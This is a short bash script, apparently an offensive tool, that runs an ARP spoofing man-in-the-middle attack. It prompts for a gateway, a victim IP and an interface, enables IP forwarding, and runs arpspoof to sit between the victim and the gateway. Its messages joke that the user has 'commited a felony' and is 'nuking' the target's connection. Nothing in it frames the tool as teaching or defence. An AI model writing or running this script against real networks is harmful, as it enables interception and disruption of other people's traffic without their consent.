## arpspoof.
echo 
  ___                 _____                        __ 
 / _ \               /  ___|                      / _|
/ /_\ \ _ __  _ __   \ `--.  _ __    ___    ___  | |_ 
|  _  || '__|| '_ \   `--. \| '_ \  / _ \  / _ \ |  _|
| | | || |   | |_) | /\__/ /| |_) || (_) || (_) || |  
\_| |_/|_|   | .__/  \____/ | .__/  \___/  \___/ |_|  
             | |            | |                       
             |_|            |_|                      
                                                        
echo ''
echo "For this attack to work, you must be on the same network and subnet as your target!"

echo ''
echo '----------'
route -n
echo '----------'

echo "Enter the network's Default Gateway (listed above)"
read defaultgateway

echo ''

echo "Enter Victim IP"
read victimIP

echo ''

echo "Enter Your network interface name (ex wlan0, also listed above)"
read interfacename

echo ''

echo "If you see Mac Addresses flying around, then congrats you commited a felony... and are now nuking your targets connection"
echo ''
echo 1 > /proc/sys/net/ipv4/ip_forward

arpspoof -i $interfacename -t $victimIP -r $defaultgateway

